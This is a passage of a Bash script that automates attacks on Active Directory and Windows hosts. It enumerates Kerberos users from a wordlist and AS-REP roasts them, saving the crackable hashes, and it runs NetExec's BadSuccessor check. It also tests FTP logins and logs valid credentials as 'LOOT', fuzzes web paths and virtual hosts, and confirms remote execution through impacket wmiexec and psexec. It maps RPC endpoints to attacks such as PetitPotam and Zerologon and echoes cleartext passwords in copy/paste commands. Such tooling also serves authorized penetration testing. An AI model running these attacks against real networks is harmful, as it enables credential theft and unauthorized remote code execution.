    warn "No domain controller operating-system records were returned"
  else
    while IFS='|' read -r \
      dn hostname operating_system operating_system_version; do

      [[ -z "${dn}${hostname}${operating_system}${operating_system_version}" ]] &&
        continue

      build_number=$(
        sed -nE 's/.*\(([0-9]+)\).*/\1/p' \
          <<< "$operating_system_version"
      )

      DC_DISTINGUISHED_NAMES+=( "$dn" )
      DC_DNS_HOSTNAMES+=( "$hostname" )
      DC_OPERATING_SYSTEMS+=( "$operating_system" )
      DC_OPERATING_SYSTEM_VERSIONS+=( "$operating_system_version" )
      DC_BUILD_NUMBERS+=( "$build_number" )
    done <<< "$records"

    if (( ${#DC_DNS_HOSTNAMES[@]} == 0 )); then
      warn "Unable to parse domain controller version information"
    else
      DC_VERSION_FOUND=true

      # Set convenient single-value variables to the first DC returned.
      DC_DNS_HOSTNAME="${DC_DNS_HOSTNAMES[0]}"
      DC_OPERATING_SYSTEM="${DC_OPERATING_SYSTEMS[0]}"
      DC_OPERATING_SYSTEM_VERSION="${DC_OPERATING_SYSTEM_VERSIONS[0]}"
      DC_BUILD_NUMBER="${DC_BUILD_NUMBERS[0]}"

      success "Found ${#DC_DNS_HOSTNAMES[@]} domain controller object(s)"

      for index in "${!DC_DNS_HOSTNAMES[@]}"; do
        echo
        echo -e "  ${CYAN}Domain Controller:${RESET} ${DC_DNS_HOSTNAMES[$index]:-Unknown}"
        echo -e "  ${CYAN}Operating System:${RESET}  ${DC_OPERATING_SYSTEMS[$index]:-Unknown}"
        echo -e "  ${CYAN}Version:${RESET}           ${DC_OPERATING_SYSTEM_VERSIONS[$index]:-Unknown}"

        if [[ -n "${DC_BUILD_NUMBERS[$index]}" ]]; then
          echo -e "  ${CYAN}Build:${RESET}             ${DC_BUILD_NUMBERS[$index]}"
        fi
      done

      success "Domain controller version evidence saved to: ${BYELLOW}${DC_VERSION_EVIDENCE}${RESET}"
    fi
  fi

  ## Start BadSuccessor Assessment
  evidence_dir="${EVIDENCE_DIR:-.}"
  mkdir -p "$evidence_dir"

  safe_target="$(sanitize_name "${TARGET_IPV4:-$TARGET}")"
  BADSUCCESSOR_EVIDENCE="$evidence_dir/badsuccessor_${safe_target}_$(date +%Y%m%d_%H%M%S).txt"

  cmd=(
    "$tool" ldap "$dc_target"
    -u "$AUTH_USER"
    -p "$AUTH_PASS"
    -d "$domain"
    -M badsuccessor
  )

  display_cmd=(
    "$tool" ldap "$dc_target"
    -u "$AUTH_USER"
    -p "$AUTH_PASS"
    -d "$domain"
    -M badsuccessor
  )

  if [[ "${NTLM_ENABLED:-true}" != true ]]; then
    cmd+=( -k )
    display_cmd+=( -k )
  fi

  printf -v repeatable '%q ' "${display_cmd[@]}"
  repeatable="${repeatable% }"
  
  echo
  info "Checking BadSuccessor/dMSA OU-permission exposure via NetExec"
  echo -e " ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
  echo -e " ${GREEN}${repeatable}${RESET}"

  record_command "LDAP" "BadSuccessor exposure check" "$repeatable"

  set +e
  output=$("${cmd[@]}" 2>&1)
  rc=$?
  set -e

  sanitized_output=$(
    printf '%s\n' "$output" |
      sed -E '/^[[:space:]]*LDAP[[:space:]].*\[\+\]/ s/:[^[:space:]]+/:<REDACTED>/'
  )

  printf '%s\n' "$sanitized_output" | tee "$BADSUCCESSOR_EVIDENCE"

  if grep -qiE \
    'module.*(not found|does not exist)|invalid.*module|unknown module' \
    <<< "$output"; then
    warn "This NetExec build does not include the badsuccessor LDAP module"
    lightbulb "Update NetExec and verify with: $tool ldap -L | grep -i badsuccessor"
    return 1
  fi

  if (( rc != 0 )); then
    if detect_kerberos_clock_skew "$output"; then
      :
    elif grep -qiE \
      'STATUS_LOGON_FAILURE|KDC_ERR|LDAPSessionError|invalid credentials|authentication failed' \
      <<< "$output"; then
      warn "BadSuccessor assessment failed during LDAP authentication"
    else
      warn "BadSuccessor assessment failed with exit code $rc"
    fi

    return "$rc"
  fi

  if grep -q \
    'Found domain controller with operating system Windows Server 2025' \
    <<< "$output"; then
    BADSUCCESSOR_DC_2025=true
    success "A Windows Server 2025 domain controller was reported"
  else
    notify "NetExec did not report a Windows Server 2025 domain controller"
  fi

  candidate_lines=$(
    printf '%s\n' "$output" |
      awk '
        /^[[:space:]]*BADSUCCE/ &&
        $0 !~ /\[[+-]\]/ &&
        $0 !~ /Found domain controller|No domain controller|Found [0-9]+ results|No account found/ {
          line=$0

          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
          sub(/^[^[:space:]]+[[:space:]]+/, "", line)

          if (line != "") {
            print line
          }
        }
      '
  )

  candidate_count=0

  if [[ -n "$candidate_lines" ]]; then
    candidate_count=$(grep -c . <<< "$candidate_lines")
    BADSUCCESSOR_CANDIDATES_FOUND=true

    if (( candidate_count == 1 )); then
      high_risk "NetExec reported 1 BadSuccessor-relevant principal/OU permission entry"
    else
      high_risk "NetExec reported $candidate_count BadSuccessor-relevant principal/OU permission entries"
    fi

    printf '%s\n' "$candidate_lines" | sed 's/^/  - /'
  else
    success "No BadSuccessor-relevant OU permission candidates were reported"
  fi

  auth_user_lc="${AUTH_USER##*\\}"
  auth_user_lc="${auth_user_lc,,}"

  if [[ "$BADSUCCESSOR_CANDIDATES_FOUND" == true ]]; then
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue

      principal="${line%% (*}"
      principal_short="${principal##*\\}"
      principal_lc="${principal_short,,}"
      applies=false

      if [[ -n "$auth_user_lc" && "$principal_lc" == "$auth_user_lc" ]]; then
        applies=true
      fi

      case "$principal_lc" in
        "authenticated users"|"everyone"|"domain users")
          applies=true
          ;;
      esac

      if [[ "$applies" != true ]]; then
        for group_name in "${AUTH_USER_GROUP_NAMES[@]:-}"; do
          group_short="${group_name##*\\}"

          if [[ "${group_short,,}" == "$principal_lc" ]]; then
            applies=true
            break
          fi
        done
      fi

      if [[ "$applies" == true ]]; then
        BADSUCCESSOR_APPLICABLE=true
        BADSUCCESSOR_APPLICABLE_TRUSTEES+=( "$line" )
      fi
    done <<< "$candidate_lines"
  fi

  if [[ "$BADSUCCESSOR_DC_2025" == true && "$BADSUCCESSOR_APPLICABLE" == true ]]; then
    high_risk "The authenticated user/group context matches a reported writable OU candidate"
    note "Treat this as a privilege-escalation exposure candidate requiring manual validation"
  elif [[ "$BADSUCCESSOR_CANDIDATES_FOUND" == true ]]; then
    notify "OU permission candidates exist, but none matched the current user or enumerated group names"
  fi

  success "BadSuccessor evidence saved to: ${BYELLOW}$BADSUCCESSOR_EVIDENCE${RESET}"
  note "This check does not verify patch state, KDS root-key availability, deny ACEs, or effective access"

  return 0
}

kerberos_auth_check() {
    command -v kinit >/dev/null 2>&1 || {
        notify "kinit not found — skipping Kerberos auth check"
        return
    }

    if [[ -z "$KERB_REALM" ]]; then
        notify "Kerberos realm not known — skipping auth check"
        return
    fi
    
    ensure_krb5_conf_from_ldap "$LDAP_DOMAIN" "$TARGET_IPV4" "$DOMAIN_CONTROLLER"
    
    echo
    info "Validating Kerberos credentials (safe check)"
    echo "[DEBUG] kinit $AUTH_USER@$KERB_REALM"

    if echo "$AUTH_PASS" | kinit "$AUTH_USER@$KERB_REALM" >/dev/null 2>&1; then
        success "Kerberos authentication successful"
        KERBEROS_AUTH_OK=true
        kdestroy
    else
        warn "Kerberos authentication failed (non-fatal)"
    fi
}

certipy_prepare_kerberos() {
    local domain="$1"
    local dc_host="$2"
    local realm
    local date_tag

    if [[ -z "$domain" ]]; then
        warn "Cannot prepare Certipy Kerberos auth — domain is empty"
        return 1
    fi

    realm="${KERB_REALM:-${domain^^}}"

    if ! command -v kinit >/dev/null 2>&1; then
        warn "kinit not found — cannot create Kerberos ccache for Certipy"
        return 1
    fi

    if [[ -n "${KRB5CCNAME:-}" ]] && klist -s >/dev/null 2>&1; then
        success "Using existing Kerberos ccache for Certipy: ${KRB5CCNAME}"
        return 0
    fi

    if [[ -n "$dc_host" && -n "$TARGET_IPV4" ]]; then
        ensure_krb5_conf_from_ldap "$domain" "$TARGET_IPV4" "$dc_host" || true
    fi

    date_tag=$(date +"%Y%m%d_%H%M%S")
    CERTIPY_KRB5_CCACHE="${PWD}/certipy_${AUTH_USER}_${TARGET_IPV4}_${date_tag}.ccache"
    export KRB5CCNAME="$CERTIPY_KRB5_CCACHE"

    info "Creating Kerberos ccache for Certipy"
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}export KRB5CCNAME='$CERTIPY_KRB5_CCACHE'${RESET}"
    echo -e "        ${GREEN}printf '%s\\n' '<password>' | kinit '${AUTH_USER}@${realm}'${RESET}"
    record_command "Kerberos" "ccache for Certipy" "export KRB5CCNAME='$CERTIPY_KRB5_CCACHE'"
    record_command "Kerberos" "ccache for Certipy" "printf '%s\\n' '<password>' | kinit '${AUTH_USER}@${realm}'"

    if printf '%s\n' "$AUTH_PASS" | kinit "${AUTH_USER}@${realm}" >/dev/null 2>&1; then
        success "Kerberos ccache ready for Certipy: ${KRB5CCNAME}"
        return 0
    fi

    warn "Failed to create Kerberos ccache for ${AUTH_USER}@${realm}"
    print_ntlm_kerberos_time_sync_note "$dc_host"
    lightbulb "Manual check: kinit '${AUTH_USER}@${realm}' && klist"
    return 1
}

resolve_kerberos_realm() {
    # Priority:
    # 1. LDAP-derived domain
    # 2. --domain argument
    # 3. DNS reverse / hostname (optional future)

    if [[ -n "$LDAP_DOMAIN" ]]; then
        KERB_REALM="${LDAP_DOMAIN^^}"
    elif [[ -n "$AUTH_DOMAIN" ]]; then
        KERB_REALM="${AUTH_DOMAIN^^}"
    else
        return 1
    fi

    success "Kerberos realm identified: $KERB_REALM"
    return 0
}

kerberos_enum_users() {
    command -v impacket-GetNPUsers >/dev/null 2>&1 || \
    command -v GetNPUsers.py >/dev/null 2>&1 || {
        warn "Kerberos enum requested, but GetNPUsers not installed"
        return
    }

    local KERB_CMD
    KERB_CMD=$(getnpusers_cmd) || return

    if [[ -z "$KERB_REALM" ]]; then
        notify "Kerberos detected, but realm not resolved — skipping enum"
        return
    fi

    echo
    info "Kerberos detected — starting user enumeration"

    COMMON_USERS=(
        administrator admin guest krbtgt test backup
        svc svc_backup svc_sql svc_mssql svc_web svc_app svc_ldap
        sqlsvc mssql exchange iis websvc appsvc backupsvc veeam
        student lab training
    )
    
    USERFILE_OK=true
    # Ensure USERS_FILE is initialized
    [ -z "$USERS_FILE" ] && USERS_FILE="users_${TARGET_IPV4}_kerbenum.txt"
    # Create users file if it doesn't exist
    [ ! -f "$USERS_FILE" ] && touch "$USERS_FILE"
    FOUND=false
    AUTH_OK=false
    ASREP_OK=false

    ########################################
    # 1. Unauthenticated enumeration
    ########################################
    info "Attempting unauthenticated Kerberos user enumeration"
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    if [ -z "$DOMAIN_CONTROLLER" ]; then
        echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET_IPV4 -no-pass${RESET}"
        record_command "Kerberos" "Unauthenticated Kerberos Enumeration - Enum Users" "$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET_IPV4 -no-pass"
    else
        echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET_IPV4 -no-pass -dc-host $DOMAIN_CONTROLLER -k${RESET}"
        record_command "Kerberos" "Unauthenticated Kerberos Enumeration - Enum Users" "$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET_IPV4 -no-pass -dc-host $DOMAIN_CONTROLLER -k"
    fi
 
    for user in "${COMMON_USERS[@]}"; do
        if [ -z "$DOMAIN_CONTROLLER" ]; then
            timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET_IPV4" -no-pass 2>&1 \
                | grep -qi 'preauth' && {
                    success "Valid Kerberos user (unauth): ${BYELLOW}$user${RESET}"
                    FOUND=true
                    # Append only if not already present
                    grep -Fxq "$user" "$USERS_FILE" || echo "$user" >> "$USERS_FILE"
               }
        else
            timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET_IPV4" -no-pass -dc-host $DOMAIN_CONTROLLER -k 2>&1 \
                | grep -qi 'preauth' && {
                    success "Valid Kerberos user (unauth): ${BYELLOW}$user${RESET}"
                    FOUND=true
                    # Append only if not already present
                    grep -Fxq "$user" "$USERS_FILE" || echo "$user" >> "$USERS_FILE"
                }
        fi
        
    done

    ########################################
    # 2. Authenticated enumeration (FIXED)
    ########################################
    if $CREDS_PROVIDED; then
        echo
        info "Attempting authenticated Kerberos enumeration"

        #OUT=$(timeout 6 "$KERB_CMD" \
        #    "$KERB_REALM/$AUTH_USER:$AUTH_PASS" \
        #    -dc-ip "$TARGET" 2>&1)
        
        if [ -z "$DOMAIN_CONTROLLER" ]; then
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET_IPV4 -k -debug${RESET}"
            record_command "Kerberos" "Authenticated Kerberos Enumeration" "$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET_IPV4 -k -debug"
            OUT=$(timeout 6 "$KERB_CMD" \
                "$KERB_REALM/$AUTH_USER:$AUTH_PASS" \
                -dc-ip "$TARGET" -k 2>&1)
        else
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-host $DOMAIN_CONTROLLER -dc-ip $TARGET_IPV4 -k -debug${RESET}"
            record_command "Kerberos" "Authenticated Kerberos Enumeration" "$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-host $DOMAIN_CONTROLLER -dc-ip $TARGET_IPV4 -k -debug"
            OUT=$(timeout 6 "$KERB_CMD" \
                "$KERB_REALM/$AUTH_USER:$AUTH_PASS" \
                -dc-host "$DOMAIN_CONTROLLER" \
                -dc-ip "$TARGET" -k 2>&1)
        fi
        

        # --- AUTH SUCCESS CONDITIONS ---
        if echo "$OUT" | grep -qiE '\$krb5asrep\$|No entries found!'; then
            success "Kerberos authentication successful (authenticated enumeration)"
            AUTH_OK=true
            FOUND=true
            KERBEROS_AUTH_OK=true
        fi

        # --- REAL AUTH FAILURE ---
        if echo "$OUT" | grep -qiE 'KDC_ERR_PREAUTH_FAILED|C_PRINCIPAL_UNKNOWN|Cannot find KDC'; then
            warn "Kerberos authentication failed"
            return
        fi
    fi
    
    ########################################
    # 4. Attempt to perform ASREP Roast
    ########################################
    # Validate USERS_FILE
    if [[ -z "${USERS_FILE:-}" ]]; then
        notify "USERS_FILE variable not set — skipping AS-REP roasting"
        USERFILE_OK=false
    elif [[ ! -f "$USERS_FILE" ]]; then
        notify "USERS_FILE does not exist ($USERS_FILE) — skipping AS-REP roasting"
        USERFILE_OK=false
    elif [[ ! -s "$USERS_FILE" ]]; then
        notify "USERS_FILE exists but is empty — skipping AS-REP roasting"
        USERFILE_OK=false
    fi
    if $USERFILE_OK; then
        ########################################
        #   AS-REP roast attempt - Unauthenticated
        ########################################
        info "Attempting AS-REP roast using discovered users - Unauthenticated"
        note "User file: $USERS_FILE"

        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/' -dc-ip $TARGET_IPV4 -usersfile $USERS_FILE${RESET}"
        record_command "Kerberos" "AS-REP roast validation using discovered users" "$KERB_CMD '$KERB_REALM/' -dc-ip $TARGET_IPV4 -usersfile $USERS_FILE"

        OUT=$(timeout 15 "$KERB_CMD" \
            "$KERB_REALM/" \
            -dc-ip "$TARGET_IPV4" \
            -usersfile "$USERS_FILE" 2>&1)

        ########################################
        # Interpret output correctly
        ########################################
        # --- protocol success ---
        if echo "$OUT" | grep -qiE '\$krb5asrep\$|No entries found!'; then
            success "Kerberos AS-REP request completed successfully"
            AUTH_OK=true
            FOUND=true
            fi

            # --- AS-REP hashes found ---
            if echo "$OUT" | grep -q '\$krb5asrep\$'; then
            critical "AS-REP roastable users identified!"
            echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET_IPV4.txt"
            success "Saved AS-REP hashes to asrep_hashes_$TARGET_IPV4.txt"
            ASREP_OK=true
        fi

        # --- Real failure conditions ---
        if echo "$OUT" | grep -qiE 'KDC_ERR_PREAUTH_FAILED|C_PRINCIPAL_UNKNOWN|Cannot find KDC'; then
            warn "Kerberos AS-REP request failed"
            ASREP_OK=false
        fi
        
        
        if $CREDS_PROVIDED; then     
            ########################################
            #   AS-REP roast attempt
            ########################################
            info "Attempting AS-REP roast using discovered users - Authenticated"
            note "User file: $USERS_FILE"

            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET_IPV4 -usersfile $USERS_FILE${RESET}"
            record_command "Kerberos" "AS-REP roast validation with user list" "$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET_IPV4 -usersfile $USERS_FILE"

            OUT=$(timeout 15 "$KERB_CMD" \
                "'$KERB_REALM/$AUTH_USER:$AUTH_PASS'" \
                -dc-ip "$TARGET_IPV4" \
                -usersfile "$USERS_FILE" 2>&1)

            ########################################
            # Interpret output correctly
            ########################################

            # --- Authentication / protocol success ---
            if echo "$OUT" | grep -qiE '\$krb5asrep\$|No entries found!'; then
                success "Kerberos AS-REP request completed successfully"
                AUTH_OK=true
                FOUND=true
            fi

            # --- AS-REP hashes found ---
            if echo "$OUT" | grep -q '\$krb5asrep\$'; then
                critical "AS-REP roastable users identified!"
                echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET_IPV4.txt"
                success "Saved AS-REP hashes to asrep_hashes_$TARGET_IPV4.txt"
                ASREP_OK=true
            fi

            # --- Real failure conditions ---
            if echo "$OUT" | grep -qiE 'KDC_ERR_PREAUTH_FAILED|C_PRINCIPAL_UNKNOWN|Cannot find KDC'; then
                warn "Kerberos AS-REP request failed"
                ASREP_OK=false
            fi
        fi
    fi

    ########################################
    # 4. Final status
    ########################################
    if $USERFILE_OK; then
        if ! $ASREP_OK; then
             warn "No AS-REP roastable users found"
        fi
    fi
    if ! $FOUND; then
        warn "Kerberos enumeration completed — no users identified"
    fi

    KERB_ENUM_DONE=true
}

ftp_auth_check() {
    local target="$1"
    local user="$2"
    local pass="$3"

    command -v netexec >/dev/null 2>&1 || {
        warn "netexec not installed — skipping authenticated FTP check"
        return
    }

    info "Attempting authenticated FTP login (netexec)"

    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}netexec ftp $TARGET_IPV4 -u '$user' -p '$pass'${RESET}"

    FTP_OUT=$(timeout 8 netexec ftp "$TARGET_IPV4" -u "$user" -p "$pass" 2>&1)

    # --- SUCCESS ---
    # netexec success indicators:
    #   [+] Login successful
    #   [+] <user>:<pass>
    if echo "$FTP_OUT" | grep -qiE '\[\+\].*(Login successful|'"$user"':'"$pass"')'; then
        critical "FTP authentication successful → $user:$pass"
        FTP_AUTH_OK=true
        echo "[LOOT] FTP AUTH $TARGET_IPV4 $user:$pass" >> ftp_valid_creds.txt
        return 
    fi

    # --- EXPLICIT FAILURE ---
    if echo "$FTP_OUT" | grep -qiE 'authentication failed|login failed|530'; then
        notify "FTP authentication failed for $user"
        return 
    fi

    # --- SERVICE PRESENT BUT RESULT UNCLEAR ---
    if echo "$FTP_OUT" | grep -qiE 'ftp.*open|connected'; then
        notify "FTP reachable, but authentication result unclear"
        return 
    fi

    # --- HARD FAILURE ---
    warn "FTP authentication check failed (no valid response)"
    return 
}

# --- Web Directory Fuzzing Function ---
run_ffuf_enum() {
    local SCHEME=$1
    local PORT=$2
    local TARGET_IP=$3
    local URL="${SCHEME}://${TARGET_IP}:${PORT}"
    local FFUF_OUT="ffuf_${TARGET_IP}_${PORT}.json"
    
    info "Starting ffuf on $URL"
    
    local FFUF_WORDLIST=$(mktemp)
    printf "%s\n" "${COMMON_FUFF_PATHS[@]}" > "$FFUF_WORDLIST"
    printf "%s\n" "${COMMON_FUFF_PATHS[@]/%/.php}" >> "$FFUF_WORDLIST"
    
    ffuf -u "$URL/FUZZ" -w "$FFUF_WORDLIST" \
        -mc 200,204,301,302,307,401,403 -fc 404 \
        -t 100 -timeout 5 -o "$FFUF_OUT" -of json > /dev/null 2>&1

    if [ -s "$FFUF_OUT" ]; then
        success "Results for $URL saved to $FFUF_OUT"
        if command -v jq >/dev/null; then
            jq -r '.results[] | "\(.status) \(.url)"' "$FFUF_OUT" | sed "s|^|    - |"
        fi
    fi
    rm -f "$FFUF_WORDLIST"
}

# --- VHost Fuzzing Function ---
run_vhost_fuzz() {
    local SCHEME=$1
    local PORT=$2
    local TARGET_IP=$3
    local URL="${SCHEME}://${TARGET_IP}:${PORT}"
    
    info "Starting VHost fuzzing on $URL"
    
    # Get baseline for this specific port
    local CURL_CMD="curl -s -o /dev/null -L"
    [[ "$SCHEME" == "https" ]] && CURL_CMD="curl -ks -o /dev/null -L"
    
    local BASE_LEN=$($CURL_CMD -w "%{http_code}:%{size_download}" "$URL")

    sort -u "$DISCOVERED_HOSTS" | grep -v '^$' | while read base_domain; do
        for word in "${COMMON_VHOSTS[@]}"; do
            local vhost="$word.$base_domain"
            local res=$($CURL_CMD -H "Host: $vhost" -w "%{http_code}:%{size_download}" "$URL")
            if [[ "$res" != "$BASE_LEN" ]]; then
                echo -e "${YELLOW}      [+] Found VHost: $vhost ($URL)${RESET}"
                echo "$TARGET_IP $vhost" >> "$HOSTS_FILE"
            fi
        done
    done
}

check_wmi_access() {
    set +e  # Disable exit-on-error for this function
    local TARGET_IP=$1
    local DOMAIN=$2
    local USER=$3
    local PASS=$4
    local l_error=false
    
    info "Testing WMI access on $TARGET_IP with user '$USER'"
    
    if ! command -v impacket-wmiexec >/dev/null 2>&1; then
        warn "impacket-wmiexec not found — skipping WMI check"
        return
    fi

    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}impacket-wmiexec $DOMAIN/$USER:'$PASS'@$TARGET_IP 'whoami'${RESET}"

    # Run with timeout to prevent hangs
    WMI_OUTPUT=$(timeout 12 impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET_IP" "whoami" 2>&1)
    RC=$?
    
    # --- TIMEOUT ---
    if [[ $RC -eq 124 ]]; then
        warn "WMI check timed out (RPC/WMI likely filtered or hung)"
        echo "$WMI_OUTPUT"
        return
    fi
    
    # --- STRING BINDING FAILURE ---
    if echo "$WMI_OUTPUT" | grep -qi "Can't find a valid stringBinding"; then
        warn "WMI service unreachable — likely RPC/WMI firewalling or no DCOM endpoints"
        echo "$WMI_OUTPUT"
        return
    fi

    # --- HARD AUTH FAILURES ---
    if echo "$WMI_OUTPUT" | grep -qiE \
        'STATUS_LOGON_FAILURE|0xc000006d|authentication failed|SMB SessionError'; then
        warn "WMI authentication failed (invalid credentials)"
        return
    fi

    # --- ACCESS DENIED (AUTH OK BUT NO WMI RIGHTS) ---
    if echo "$WMI_OUTPUT" | grep -qiE \
        'access denied|rpc_s_access_denied'; then
        notify "WMI reachable but access denied (user lacks WMI privileges)"
        return
    fi
    
    if [[ "$l_error" != "true" ]]; then
        # --- SUCCESS ---
        if echo "$WMI_OUTPUT" | grep -qiE \
            'NT AUTHORITY|\\\\'; then
            critical "WMI access confirmed — remote execution possible"
            WMI_AUTH_OK=true
        fi

        # --- FALLBACK ---
        notify "WMI test inconclusive — raw output:"
        echo "$WMI_OUTPUT"
    fi
}

check_psexec_access() {
    set +e  # Disable exit-on-error for this function
    local TARGET_IP=$1
    local DOMAIN=$2
    local USER=$3
    local PASS=$4

    info "Testing PsExec access on $TARGET_IP with user '$USER'"

    if ! command -v impacket-psexec >/dev/null 2>&1; then
        warn "impacket-psexec not found — skipping PsExec check"
        return
    fi
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}impacket-psexec $DOMAIN/$USER:'$PASS'@$TARGET_IP ${RESET}"
    
    # Run with timeout to avoid hangs
    PSEXEC_OUTPUT=$(timeout 12 impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET_IP" "whoami" 2>&1)

    RC=$?
    
    if echo "$PSEXEC_OUTPUT" | grep -q "Found writable share" && echo "$PSEXEC_OUTPUT" | grep -q "Uploading file"; then
        critical "PsExec access confirmed — service executed and file upload observed"
        PSEXEC_AUTH_OK=true
        set -e
        return
    fi

    if [[ $RC -eq 124 ]]; then
        warn "PsExec check timed out (likely firewall or unresponsive SMB)"
        echo "$PSEXEC_OUTPUT"
        return
    fi

    # Handle known failures
    if echo "$PSEXEC_OUTPUT" | grep -qiE 'STATUS_LOGON_FAILURE|0xc000006d|authentication failed|SMB SessionError'; then
        warn "PsExec authentication failed (bad creds)"
        return
    fi

    if echo "$PSEXEC_OUTPUT" | grep -qi "STATUS_ACCESS_DENIED"; then
        notify "PsExec reachable, but access denied — user may lack service creation rights"
        return
    fi

    if echo "$PSEXEC_OUTPUT" | grep -qi "Unable to connect|ConnectionError|Network is unreachable"; then
        warn "PsExec connection failed — host may be down or filtered"
        return
    fi

    if echo "$PSEXEC_OUTPUT" | grep -qiE 'NT AUTHORITY|\\\\'; then
        critical "PsExec access confirmed — remote execution possible"
        PSEXEC_AUTH_OK=true
        return
    fi

    # Fallback for unknown state
    notify "PsExec test inconclusive — raw output:"
    echo "$PSEXEC_OUTPUT"
}

# --------- RPC Checks ----------
declare -A RPC_UUID_ATTACKS=(
    ["c681d488-d850-11d0-8c52-00c04fd90f7e"]="MS-EFSRPC (PetitPotam / NTLM coercion)"
    ["12345778-1234-abcd-ef00-0123456789ac"]="LSARPC (policy / SID enumeration)"
    ["367abb81-9844-35f1-ad32-98f038001003"]="WMI (DCOM remote execution surface)"
    ["8d9f4e40-a03d-11ce-8f69-08003e30051b"]="DCOM IObjectExporter (lateral movement)"
    ["6bffd098-a112-3610-9833-012892020162"]="NETLOGON (MS-NRPC / relay / Zerologon-class)"
    ["4b324fc8-1670-01d3-1278-5a47bf6ee188"]="SRVSVC (SMB share & host enumeration)"
    ["e3514235-4b06-11d1-ab04-00c04fc2dcd2"]="Active Directory RPC (BloodHound surface)"
)

parse_rpcdump_and_map_attacks() {
    set +e  # Disable exit-on-error for this function
    local target="$1"
    local dump_file="rpcdump_${target}_anon.txt"

    [[ ! -f "$dump_file" ]] && return

    info "Parsing MSRPC UUIDs and mapping to known attack paths"

    FOUND_RPC_ATTACKS=()

    while IFS= read -r uuid; do
        attack="${RPC_UUID_ATTACKS[$uuid]}"
        if [[ -n "$attack" ]]; then
            FOUND_RPC_ATTACKS+=("$uuid → $attack")
        fi
    done < <(grep -oE '[a-f0-9-]{36}' "$dump_file" | sort -u)

    if [[ ${#FOUND_RPC_ATTACKS[@]} -gt 0 ]]; then
        RPC_ATTACK_MAP_FOUND=true

        echo "${FOUND_RPC_ATTACKS[@]}" > "rpc_attackmap_${target}.txt"

        critical "Known RPC attack paths identified"
        for a in "${FOUND_RPC_ATTACKS[@]}"; do
            echo "   - $a"
        done

        success "Saved RPC attack map → rpc_attackmap_${target}.txt"
    else
        note "No known exploitable RPC UUIDs detected"
    fi
}

check_rpc_services() {
    set +e  # Disable exit-on-error for this function
    local target="$1"

    # ------------------------------
    # 1. Anonymous MSRPC via rpcdump.py
    # ------------------------------
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "135"; then
        if command -v rpcdump.py >/dev/null; then
            info "Enumerating MSRPC endpoints on $target with rpcdump.py (anonymous)"
            output=$(rpcdump.py @"$target" 2>&1)
            echo "$output" > "rpcdump_${target}_anon.txt"

            if echo "$output" | grep -q "UUID"; then
                critical "Anonymous MSRPC enumeration successful!"
                MSRPC_ANON_OK=true
		parse_rpcdump_and_map_attacks "$target"
            else
                warn "Anonymous MSRPC enumeration failed"
                MSRPC_ANON_OK=false
            fi
        fi
    fi

    # ------------------------------
    # 2. SMB RPC via rpcclient (anonymous and guest)
    # ------------------------------
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -q -E '^445$|^139$'; then
        if command -v rpcclient >/dev/null; then
            info "Testing anonymous SMB RPC (rpcclient -U '' $target)"
            if echo "exit" | rpcclient -U "" "$target" 2>&1 | grep -vq "NT_STATUS_LOGON_FAILURE"; then
                critical "Anonymous SMB RPC login successful!"
                RPC_ANON_OK=true
            else
                warn "Anonymous SMB RPC login failed"
                RPC_ANON_OK=false
            fi

            info "Testing guest SMB RPC (rpcclient -U guest% $target)"
            if echo "exit" | rpcclient -U "guest%" "$target" 2>&1 | grep -vq "NT_STATUS_LOGON_FAILURE"; then
                critical "Guest SMB RPC login successful!"
                RPC_GUEST_OK=true
            else
                warn "Guest SMB RPC login failed"
                RPC_GUEST_OK=false
            fi
        fi
    fi

    # ------------------------------
    # 3. Authenticated MSRPC (rpcclient) if creds provided
    # ------------------------------
    if $CREDS_PROVIDED && command -v rpcclient >/dev/null; then
        info "Testing authenticated SMB RPC (rpcclient -U $AUTH_USER%$AUTH_PASS)"
        if echo "exit" | rpcclient -U "$AUTH_USER%$AUTH_PASS" "$target" 2>&1 | grep -vq "NT_STATUS_LOGON_FAILURE"; then
            critical "Authenticated SMB RPC login successful!"
            RPC_AUTH_OK=true
        else
            warn "Authenticated SMB RPC login failed"
            RPC_AUTH_OK=false
        fi
    fi
}

#SMB_V1=false
#SMB_V2=false
#SMB_V3=false
